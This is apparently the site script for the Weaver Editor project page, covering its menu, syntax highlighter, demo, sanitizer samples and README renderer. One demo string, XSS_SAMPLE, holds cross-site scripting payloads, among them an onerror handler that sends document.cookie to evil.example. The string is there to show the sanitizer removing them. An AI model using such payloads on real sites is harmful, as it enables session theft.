/* Weaver Editor — scripts do site (menu, demonstração, código e documentação). */
(function () {
  'use strict';

  var REPO = 'https://github.com/edersonfr/weaver-editor';

  // ---------- Menu no celular ----------
  var toggle = document.querySelector('.menu-toggle');
  var nav = document.getElementById('site-nav');
  if (toggle && nav) {
    toggle.addEventListener('click', function () {
      var open = nav.classList.toggle('open');
      toggle.setAttribute('aria-expanded', String(open));
    });
    nav.addEventListener('click', function (e) {
      if (e.target.tagName === 'A') {
        nav.classList.remove('open');
        toggle.setAttribute('aria-expanded', 'false');
      }
    });
  }

  // ---------- Realce de sintaxe (HTML, JS, PHP, bash) ----------
  function escapeHtml(text) {
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function highlight(code, lang) {
    var source = String(code);
    if (/^(html|xml)$/.test(lang)) {
      return source.replace(/(<!--[\s\S]*?-->)|(<\/?)([\w-]+)([^>]*?)(\/?>)|([^<]+)/g, function (m, comment, open, tag, attrs, close, text) {
        if (comment) return '<span class="tok-com">' + escapeHtml(comment) + '</span>';
        if (text) return escapeHtml(text);
        var attrHtml = attrs.replace(/([\w:-]+)(=)("[^"]*"|'[^']*')?|([^\s=]+)/g, function (a, name, eq, value, other) {
          if (other) return escapeHtml(other);
          return '<span class="tok-attr">' + escapeHtml(name) + '</span>' + eq + (value ? '<span class="tok-str">' + escapeHtml(value) + '</span>' : '');
        });
        return '<span class="tok-tag">' + escapeHtml(open + tag) + '</span>' + attrHtml + '<span class="tok-tag">' + escapeHtml(close) + '</span>';
      });
    }
    if (/^(js|javascript|php|bash|sh)$/.test(lang)) {
      var keywords = /^(var|let|const|function|return|if|else|new|true|false|null|this|echo|curl|npm|npx)$/;
      return source.replace(/(\/\/[^\n]*|#[^\n]*)|("(?:[^"\\\n]|\\.)*"|'(?:[^'\\\n]|\\.)*')|([A-Za-z_$][\w$]*)|([\s\S])/g, function (m, comment, str, word, other) {
        if (comment) {
          // "#" só é comentário em bash; em JS ele aparece em seletores ('#artigo')
          if (comment.charAt(0) === '#' && !/^(bash|sh)$/.test(lang)) return escapeHtml(comment);
          return '<span class="tok-com">' + escapeHtml(comment) + '</span>';
        }
        if (str) return '<span class="tok-str">' + escapeHtml(str) + '</span>';
        if (word) return keywords.test(word) ? '<span class="tok-key">' + word + '</span>' : word;
        return escapeHtml(other);
      });
    }
    return escapeHtml(source);
  }

  function enhanceCode(root) {
    var blocks = root.querySelectorAll('pre > code');
    for (var i = 0; i < blocks.length; i++) {
      var code = blocks[i];
      var lang = code.getAttribute('data-lang') || '';
      var text = code.textContent.replace(/^\n+|\s+$/g, '');
      code.innerHTML = highlight(text, lang);

      var pre = code.parentNode;
      if (pre.parentNode.classList.contains('code-block')) continue;
      var wrapper = document.createElement('div');
      wrapper.className = 'code-block';
      pre.parentNode.insertBefore(wrapper, pre);
      wrapper.appendChild(pre);

      if (navigator.clipboard) {
        var button = document.createElement('button');
        button.type = 'button';
        button.className = 'copy';
        button.textContent = 'Copiar';
        button.setAttribute('aria-label', 'Copiar código');
        button.addEventListener('click', (function (source, btn) {
          return function () {
            navigator.clipboard.writeText(source).then(function () {
              btn.textContent = 'Copiado';
              setTimeout(function () { btn.textContent = 'Copiar'; }, 1800);
            });
          };
        })(text, button));
        wrapper.appendChild(button);
      }
    }
  }

  enhanceCode(document);

  // ---------- Demonstração ----------
  function aiDemoResponse(prompt) {
    var safe = escapeHtml(prompt);
    return '<p><b>Texto gerado para:</b> ' + safe + '</p>' +
      '<p>Esta é uma resposta de exemplo. No seu site, o assistente envia a instrução para o Gemini ou a OpenAI e insere o HTML gerado aqui, já sanitizado.</p>';
  }

  var demo = null;
  if (window.jQuery && jQuery.fn.weaver) {
    jQuery('#weaver-demo').weaver({
      height: 340,
      placeholder: 'Escreva algo...',
      onAiGenerate: function (prompt, done) {
        setTimeout(function () { done(aiDemoResponse(prompt)); }, 700);
      }
    });
    demo = jQuery('#weaver-demo').data('weaver');
  }

  // Tema escuro do editor da demonstração (editor.setTheme)
  var themeToggle = document.getElementById('theme-toggle');
  if (themeToggle && demo && demo.setTheme) {
    themeToggle.addEventListener('click', function () {
      var dark = themeToggle.getAttribute('aria-pressed') !== 'true';
      demo.setTheme(dark ? 'dark' : 'light');
      themeToggle.setAttribute('aria-pressed', String(dark));
      themeToggle.textContent = dark ? 'Voltar ao tema claro' : 'Ver no tema escuro';
    });
  } else if (themeToggle) {
    themeToggle.hidden = true;
  }

  // ---------- O que o formulário recebe ----------

  /** Quebra o HTML em linhas por bloco, para ler na folha. */
  function formatHtml(html) {
    var blocks = 'p|h[1-6]|ul|ol|li|blockquote|table|thead|tbody|tr|div|section|pre|figure|hr|style|script';
    return String(html)
      .replace(new RegExp('(</(' + blocks + ')>)', 'gi'), '$1\n')
      .replace(new RegExp('(<(ul|ol|table|thead|tbody|tr|section)\\b[^>]*>)', 'gi'), '$1\n')
      .replace(/\n\s*\n/g, '\n')
      .replace(/^(<li\b|<tr\b|<td\b)/gim, '  $1')
      .trim();
  }

  function bytes(text) {
    var n = window.TextEncoder ? new TextEncoder().encode(text).length : text.length;
    return n.toLocaleString('pt-BR') + ' bytes';
  }

  var WORD_SAMPLE = '<html xmlns:o="urn:schemas-microsoft-com:office:office"><body>' +
    '<p class="MsoNormal" style="font-family:Calibri;font-size:11pt;mso-bidi-font-family:Arial"><b><span style="font-size:14pt;mso-fareast-font-family:Calibri">Caneca de cerâmica 350 ml</span></b></p>' +
    '<p class="MsoNormal" style="font-family:Calibri;margin-bottom:8pt">Esmalte fosco, pode ir ao micro-ondas e à lava-louças.</p>' +
    '<p class="MsoListParagraphCxSpFirst" style="mso-list:l0 level1 lfo1"><span style="mso-list:Ignore">·<span>&nbsp;&nbsp;</span></span>Capacidade: 350 ml</p>' +
    '<p class="MsoListParagraphCxSpLast" style="mso-list:l0 level1 lfo1"><span style="mso-list:Ignore">·<span>&nbsp;&nbsp;</span></span>Cores: areia, musgo e grafite</p></body></html>';

  var XSS_SAMPLE = '<p>Promoção de hoje!</p>\n' +
    '<img src="x" onerror="fetch(\'//evil.example/?c=\'+document.cookie)">\n' +
    '<a href="javascript:alert(1)" onclick="roubar()">Ver oferta</a>\n' +
    '<script>alert("xss")</script>\n' +
    '<p style="position:fixed;inset:0;background:url(//evil.example/x.png)">Clique</p>';

  var TRUSTED_SAMPLE = '<!-- banner -->\n' +
    '<section data-id="banner" style="display:grid;gap:8px;background-image:url(https://img.exemplo.com/a.jpg)">\n' +
    '<style>.titulo{color:#0165ad}</style>\n' +
    '<font face="Arial" class="titulo">Frete grátis</font>\n' +
    '</section>';

  var TRUSTED_OPTIONS = {
    allowedTags: '*',
    allowedAttributes: { '*': ['class', 'id', 'style', 'face', /^data-[\w-]+$/] },
    allowedStyles: '*',
    allowCssUrls: true,
    keepComments: true,
    forbiddenTags: ['script']
  };

  function sanitizeWith(options, html) {
    var merged = window.WysiwygEditor.mergeOptions(window.WysiwygEditor.defaults, options || {});
    return new window.HtmlSanitizer(merged).sanitize(html);
  }

  function wordOutput() {
    var clean = window.SanitizerPlugin && SanitizerPlugin.cleanOfficeHtml ? SanitizerPlugin.cleanOfficeHtml(WORD_SAMPLE) : WORD_SAMPLE;
    return demo.sanitize(clean);
  }

  var SAMPLES = {
    live: function () {
      return { field: 'conteudo_html', output: demo.getContent() };
    },
    word: function () {
      return { field: 'conteudo_html', input: WORD_SAMPLE, inputLabel: 'Colado do Word', output: wordOutput() };
    },
    xss: function () {
      return { field: 'conteudo_html', input: XSS_SAMPLE, inputLabel: 'Colado de um site qualquer', output: demo.sanitize(XSS_SAMPLE) };
    },
    trusted: function () {
      return {
        field: 'conteudo_html', input: TRUSTED_SAMPLE, inputLabel: 'HTML de um construtor de páginas',
        output: sanitizeWith(TRUSTED_OPTIONS, TRUSTED_SAMPLE),
        options: "allowedTags: '*', allowedStyles: '*', allowCssUrls: true, keepComments: true, data-* liberado"
      };
    }
  };

  var sheet = document.getElementById('sheet');
  var sheetBody = document.getElementById('sheet-body');
  var current = 'live';

  function renderSheet(name) {
    var s = SAMPLES[name]();
    var html = '';
    if (s.options) {
      html += '<p class="sheet-options">Opções: <code>' + escapeHtml(s.options) + '</code></p>';
    }
    if (s.input) {
      html += '<p class="sheet-label"><span>' + escapeHtml(s.inputLabel) + '</span><span>' + bytes(s.input) + '</span></p>' +
        '<pre class="is-input"><code>' + escapeHtml(s.input) + '</code></pre>';
    }
    var output = formatHtml(s.output);
    html += '<p class="sheet-label"><span>Enviado no formulário</span><span>' + bytes(s.output) + '</span></p>' +
      '<pre><code data-lang="html">' + escapeHtml(output || '(vazio)') + '</code></pre>';
    sheetBody.innerHTML = html;
    var code = sheetBody.querySelector('code[data-lang]');
    code.innerHTML = highlight(output || '(vazio)', 'html');
  }

  if (sheet && demo && window.HtmlSanitizer) {
    var names = document.querySelectorAll('.output-name');
    var select = function (name) {
      current = name;
      for (var n = 0; n < names.length; n++) names[n].setAttribute('aria-pressed', String(names[n].getAttribute('data-sample') === name));
      sheet.classList.add('is-swapping');
      setTimeout(function () { renderSheet(name); sheet.classList.remove('is-swapping'); }, 200);
    };
    for (var n = 0; n < names.length; n++) {
      names[n].addEventListener('click', function () { select(this.getAttribute('data-sample')); });
    }
    renderSheet('live');
    // O seu texto: acompanha o editor lá em cima
    jQuery('#weaver-demo').on('change', function () { if (current === 'live') renderSheet('live'); });

    // Instalação: o que chega no servidor (a mesma colagem do Word do vídeo)
    var requestValue = document.getElementById('request-value');
    if (requestValue) {
      var sent = wordOutput();
      requestValue.textContent = formatHtml(sent);
      document.getElementById('request-size').textContent = bytes(sent);
    }
  }

  // ---------- A frase com a lacuna ----------
  var startForm = document.getElementById('start-form');
  if (startForm) {
    var startInput = document.getElementById('start-id');
    var startCode = document.getElementById('start-code');
    var startButton = startForm.querySelector('.start-button');
    var snippet = function () {
      var id = startInput.value.replace(/^#/, '').replace(/[^\w-]/g, '') || 'artigo';
      return "$('#" + id + "').weaver();";
    };
    startInput.addEventListener('input', function () { startCode.textContent = snippet(); });
    startForm.addEventListener('submit', function (e) {
      e.preventDefault();
      if (!navigator.clipboard) return;
      navigator.clipboard.writeText(snippet()).then(function () {
        startButton.textContent = 'copiado';
        setTimeout(function () { startButton.textContent = 'copiar'; }, 1800);
      });
    });
  }

  // ---------- Entradas por rolagem (uma vez) ----------
  var revealTargets = document.querySelectorAll('[data-reveal], .output-names, .output-stage, .start');
  if ('IntersectionObserver' in window) {
    var revealer = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (!entry.isIntersecting) return;
        entry.target.classList.add('is-in');
        revealer.unobserve(entry.target);
      });
    }, { rootMargin: '0px 0px -12% 0px' });
    for (var r = 0; r < revealTargets.length; r++) revealer.observe(revealTargets[r]);
  } else {
    for (var q = 0; q < revealTargets.length; q++) revealTargets[q].classList.add('is-in');
  }

  // ---------- Documentação a partir do README ----------

  /** GitHub: "Uso básico" -> "uso-básico" */
  function slugify(text) {
    return text.toLowerCase().trim()
      .replace(/<[^>]+>/g, '')
      .replace(/[^\w\u00C0-\u024F\s-]/g, '')
      .replace(/\s/g, '-');
  }

  function resolveUrl(url) {
    if (/^(https?:|mailto:|#)/i.test(url)) return url;
    if (/^javascript:/i.test(url.replace(/\s+/g, ''))) return '#';
    return REPO + '/blob/main/' + url.replace(/^\.\//, '');
  }

  function inline(text) {
    var codes = [];
    var out = text.replace(/`([^`]+)`/g, function (m, code) {
      codes.push('<code>' + escapeHtml(code) + '</code>');
      return '\u0000' + (codes.length - 1) + '\u0000';
    });
    out = escapeHtml(out);
    out = out.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, ''); // imagens (badges) não entram no site
    out = out.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, function (m, label, url) {
      return '<a href="' + escapeHtml(resolveUrl(url.replace(/&amp;/g, '&'))) + '">' + label + '</a>';
    });
    out = out.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
    out = out.replace(/(^|[\s(])_([^_]+)_(?=[\s).,;:!?]|$)/g, '$1<em>$2</em>');
    return out.replace(/\u0000(\d+)\u0000/g, function (m, i) { return codes[+i]; });
  }

  function dedent(lines) {
    var min = Infinity;
    lines.forEach(function (l) {
      if (l.trim()) min = Math.min(min, l.match(/^ */)[0].length);
    });
    return lines.map(function (l) { return l.slice(min === Infinity ? 0 : min); });
  }

  function renderBlocks(lines) {
    var html = '';
    var i = 0;

    while (i < lines.length) {
      var line = lines[i];

      if (!line.trim()) { i++; continue; }

      var fence = line.match(/^(\s*)```(\w*)/);
      if (fence) {
        var body = [];
        i++;
        while (i < lines.length && !/^\s*```/.test(lines[i])) body.push(lines[i++]);
        i++;
        var lang = fence[2] === 'javascript' ? 'js' : fence[2];
        html += '<pre><code data-lang="' + escapeHtml(lang) + '">' + escapeHtml(dedent(body).join('\n')) + '</code></pre>';
        continue;
      }

      var heading = line.match(/^(#{1,4})\s+(.*)$/);
      if (heading) {
        var level = Math.max(2, heading[1].length);
        var title = heading[2].trim();
        html += '<h' + level + ' id="' + slugify(title) + '">' + inline(title) + '</h' + level + '>';
        i++;
        continue;
      }

      if (/^\s*\|/.test(line)) {
        var rows = [];
        while (i < lines.length && /^\s*\|/.test(lines[i])) rows.push(lines[i++]);
        var cells = function (row) {
          return row.trim().replace(/^\||\|$/g, '').split(/(?<!\\)\|/).map(function (c) { return c.trim(); });
        };
        var head = cells(rows[0]);
        var table = '<div class="table-scroll"><table><thead><tr>' + head.map(function (c) { return '<th scope="col">' + inline(c) + '</th>'; }).join('') + '</tr></thead><tbody>';
        rows.slice(2).forEach(function (r) {
          table += '<tr>' + cells(r).map(function (c) { return '<td>' + inline(c) + '</td>'; }).join('') + '</tr>';
        });
        html += table + '</tbody></table></div>';
        continue;
      }

      if (/^>\s?/.test(line)) {
        var quote = [];
        while (i < lines.length && /^>\s?/.test(lines[i])) quote.push(lines[i++].replace(/^>\s?/, ''));
        html += '<blockquote>' + renderBlocks(quote) + '</blockquote>';
        continue;
      }

      var bullet = /^(\s*)([-*]|\d+\.)\s+/;
      if (bullet.test(line)) {
        var ordered = /^\s*\d+\./.test(line);
        var items = [];
        var current = null;
        while (i < lines.length) {
          var l = lines[i];
          if (bullet.test(l) && l.match(/^ */)[0].length === 0) {
            current = [l.replace(bullet, '')];
            items.push(current);
            i++;
          } else if (current && (l.match(/^ {2,}/) || !l.trim())) {
            // continuação do item (texto ou código recuado)
            if (!l.trim() && (i + 1 >= lines.length || !/^ {2,}/.test(lines[i + 1]))) break;
            current.push(l);
            i++;
          } else {
            break;
          }
        }
        var tag = ordered ? 'ol' : 'ul';
        html += '<' + tag + '>' + items.map(function (item) {
          var first = item[0];
          var rest = dedent(item.slice(1));
          var hasBlocks = rest.some(function (r) { return r.trim(); });
          var nested = hasBlocks ? renderBlocks(rest) : '';
          // linhas de continuação simples (sem código) juntam-se ao parágrafo
          if (hasBlocks && !/```|^\s*[-*]\s/m.test(rest.join('\n'))) {
            return '<li>' + inline(first + ' ' + rest.join(' ').trim()) + '</li>';
          }
          return '<li>' + inline(first) + nested + '</li>';
        }).join('') + '</' + tag + '>';
        continue;
      }

      var para = [];
      while (i < lines.length && lines[i].trim() && !/^(#{1,4}\s|```|\s*\||>|\s*[-*]\s|\d+\.\s)/.test(lines[i])) {
        para.push(lines[i++].trim());
      }
      if (para.length) {
        html += '<p>' + inline(para.join(' ')) + '</p>';
      } else {
        i++; // linha que nenhum bloco reconheceu
      }
    }

    return html;
  }

  /** Seções do README que viram documentação no site (as demais já estão na página). */
  var SKIP_SECTIONS = /^(sumário|funcionalidades|instalação|uso básico|licença)$/i;

  function renderReadme(markdown) {
    var sections = markdown.replace(/\r\n?/g, '\n').split(/\n(?=## )/);
    var kept = sections.filter(function (s) {
      var m = s.match(/^## (.+)/);
      return m && !SKIP_SECTIONS.test(m[1].trim());
    });
    return renderBlocks(kept.join('\n').split('\n'));
  }

  function buildToc(body, toc) {
    var headings = body.querySelectorAll('h2');
    var links = [];
    for (var i = 0; i < headings.length; i++) {
      var li = document.createElement('li');
      var a = document.createElement('a');
      a.href = '#' + headings[i].id;
      a.textContent = headings[i].textContent;
      li.appendChild(a);
      toc.appendChild(li);
      links.push(a);
    }

    if (!('IntersectionObserver' in window)) return;
    var observer = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (!entry.isIntersecting) return;
        links.forEach(function (l) { l.removeAttribute('aria-current'); });
        var active = toc.querySelector('a[href="#' + entry.target.id + '"]');
        if (active) active.setAttribute('aria-current', 'true');
      });
    }, { rootMargin: '-90px 0px -65% 0px' });
    for (var j = 0; j < headings.length; j++) observer.observe(headings[j]);
  }

  var docsBody = document.getElementById('docs-body');
  var docsToc = document.getElementById('docs-toc');

  if (docsBody && window.fetch) {
    fetch(docsBody.getAttribute('data-readme'), { cache: 'no-cache' })
      .then(function (response) {
        if (!response.ok) throw new Error('HTTP ' + response.status);
        return response.text();
      })
      .then(function (markdown) {
        docsBody.innerHTML = renderReadme(markdown);
        enhanceCode(docsBody);
        buildToc(docsBody, docsToc);
        // Link direto para uma seção (#opções) depois que ela existe
        if (location.hash && document.getElementById(decodeURIComponent(location.hash.slice(1)))) {
          document.getElementById(decodeURIComponent(location.hash.slice(1))).scrollIntoView();
        }
      })
      .catch(function () {
        docsBody.innerHTML = '<p class="docs-status">Não foi possível carregar a documentação agora. Leia o <a href="' + REPO + '#readme">README no GitHub</a>.</p>';
      });
  }

  // Exposto para os testes
  window.WeaverSite = { renderReadme: renderReadme, highlight: highlight, slugify: slugify };
})();
